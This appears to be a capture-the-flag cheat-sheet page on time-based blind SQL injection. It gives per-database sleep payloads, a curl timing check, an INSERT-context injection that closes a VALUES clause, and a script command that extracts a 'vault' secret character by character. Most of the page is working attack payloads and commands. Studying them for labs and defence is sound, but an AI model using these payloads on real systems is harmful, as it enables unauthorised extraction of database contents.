# Time-based blind SQLi

**Signs**: response is identical whatever you send ("Thanks for your note!"), but a sleep makes it
slower. Hint "every note gets the same thanks; sometimes it takes longer; measure the silence".

## 1. Confirm
| DBMS | Payload |
|---|---|
| MySQL/MariaDB | `x' AND SLEEP(2)-- -`, `x' OR IF(1=1,SLEEP(2),0)-- -` |
| PostgreSQL | `x'; SELECT pg_sleep(2)--`, `x' AND 1=(SELECT 1 FROM pg_sleep(2))--` |
| MSSQL | `x'; WAITFOR DELAY '0:0:2'--` |
| SQLite | `x' AND 1=randomblob(300000000)--` (heavy CPU), `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))` |
```bash
curl -s -o /dev/null -w '%{time_total}\n' --data-urlencode "name=x' AND SLEEP(2)-- -" -d 'message=hi' $T/
```

## 2. INSERT context (guestbook / signup / feedback)
The input sits inside `VALUES ('<name>', '<message>')`. Stacked queries (`; SELECT SLEEP`) are
usually **not** executed by the driver — put the condition *inside* VALUES and keep the column
count right:
```sql
x', (SELECT IF(<COND>, SLEEP(0.5), 0)) ) -- 
```
→ `VALUES ('x', (SELECT IF(...)) ) -- ', '<message>')` — the extra `)` closes `VALUES (`.
More: [insert-update](insert-update.md).

## 3. Extract
```sql
IF(ASCII(SUBSTRING((SELECT secret FROM vault LIMIT 1),{pos},1))>{mid}, SLEEP(0.5), 0)
```
```bash
python scripts/sqli/blind_time.py "$T/" --post "name={}&message=hi" \
  --template "x', (SELECT IF(({cond}),SLEEP(0.6),0)) ) -- " \
  --query "SELECT secret FROM vault LIMIT 1" --dbms mysql --delay 0.6
```
Tips: keep delay small (0.5–1 s) but well above jitter; script re-checks borderline timings;
expect ~1 min for a 40-char flag. sqlmap: `--technique=T --time-sec 1`.

Seen in: `sqli6` (Guestbook, MariaDB INSERT, `SLEEP(0.5)`, `vault.secret`), `wordpress` (time-based
oracle inside the wp2shell chain).
